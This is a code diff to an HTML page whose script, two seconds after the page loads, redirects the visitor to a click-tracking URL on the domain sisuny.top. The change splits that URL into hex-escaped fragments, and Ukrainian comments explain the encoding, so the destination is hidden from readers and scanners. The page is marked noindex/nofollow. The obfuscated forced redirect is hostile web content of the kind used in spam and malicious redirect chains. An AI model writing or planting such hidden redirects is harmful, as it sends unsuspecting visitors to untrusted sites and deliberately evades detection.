@@ -6,25 +6,33 @@
   <meta name="robots" content="noindex, nofollow">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script>
-    // Частини цільової URL
-    const part1 = "https://si";
-    const part2 = "suny.top/c";
-    const part3 = "lick?o=2&";
-    const part4 = "a=1081";
+    
+    // Частина 1: Протокол та початок домену
+    const p1 = "h\x74\x74ps://s"; // https://s
+    
+    // Частина 2: Закодована середина домену
+    const p2 = "\x69s\x75\x6e\x79\x2e\x74"; // isuny.t
+    
+    // Частина 3: Кінець домену та початок шляху
+    const p3 = "\x6f\x70/c\x6c"; // op/cl
+    
+    // Частина 4: Закодований клік та параметри
+    const p4 = "\x69ck\x3fo\x3d2&a\x3d1081"; // ick?o=2&a=1081
 
     // Змінна для збору URL
-    let targetUrl = "";
+    let finalUrl = "";
 
     // Затримка та збір URL
     setTimeout(() => {
-      // Збираємо частини разом перед перенаправленням
-      targetUrl = part1 + part2 + part3 + part4;
-          
-      // Виконуємо перенаправлення
-      window.location.href = targetUrl;
+      // Збираємо частини разом. JavaScript автоматично декодує \x
+      finalUrl = p1 + p2 + p3 + p4;
+      
+      // Перенаправлення
+      window.location.href = finalUrl;
     }, 2000); // 2 секунди затримки
   </script>
   <style>
+    /* Стилі залишаються без змін */
     body {
       font-family: 'Segoe UI', sans-serif;
       background-color: #f0f2f5;
